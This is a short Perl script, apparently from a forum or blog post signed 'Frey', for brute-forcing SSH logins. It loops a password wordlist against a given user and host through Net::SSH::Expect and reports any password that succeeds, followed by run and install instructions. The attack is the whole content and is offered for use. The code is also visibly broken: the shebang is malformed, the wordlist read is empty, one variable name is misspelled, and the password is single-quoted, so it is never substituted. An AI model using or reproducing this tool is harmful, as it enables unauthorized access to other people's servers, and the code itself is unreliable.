#!/bin/sh/perl

use Net::SSH::Expect;

my $username = @ARGV[0];
my $password_list = @ARGV[1];
my $host = @ARGV[2];
my $ssh;

#usage: perl ssh_brute.pl username password_list host

open(WORDLIST, "$password_list")
or die "[!] Failed to open: $password_list";

#read each line of the file
#try it as a password

@wordlist=;

foreach $password (@wordlist)
{

chomp($passwod);
print "[*]Trying $password \n";

#try the password with user-password authentication
#build the constructor
my $ssh = Net::SSH::Expect -> new (
host => "$host",
password => '$password',
user => '$username',
raw_pty => 1
);

if($ssh -> login())
{

print "[*]$password is the password to $host.";
$ssh -> close();
die;

}

}
die "[!] Password was not found.";

To run it, simply type: perl ssh_brute.pl username password_list host

If you get a error that Net::SSH::Expect is missing, please run:

cpan

Than:

install Net::SSH::Expect

And this should install the required library.

-Frey

